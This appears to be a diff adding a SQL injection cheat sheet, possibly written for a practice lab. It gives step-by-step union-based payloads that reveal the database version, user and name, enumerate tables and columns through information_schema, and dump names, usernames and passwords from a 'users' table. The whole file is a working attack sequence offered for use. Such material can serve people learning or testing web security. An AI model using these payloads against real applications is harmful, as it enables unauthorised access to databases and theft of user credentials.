@@ -1,0 +1,35 @@
+
+-- DB General Information Gathering --
+
+Get SQL DB Version
+' or 0=0 union select null, version() #
+
+Get DB User
+ or 0=0 union select null, user() #
+
+Get Database name
+' or 0=0 union select null, database() #
+
+
+-- Steps to find and retrieve a specific table --
+
+Get all table names in information_schema
+' and 1=0 union select null, table_name from information_schema.tables #
+
+--
+
+Find table names resembling 'user'
+
+' and 1=0 union select null, table_name from information_schema.tables where table_name like 'user%'#
+
+--
+
+After finding table name, display the column names within that table.(Example table name here is 'users')
+
+' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users' #
+
+--
+
+Display everything from 'users' table. (0x0a is a newline, replace column names accordingly)
+
+' union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #
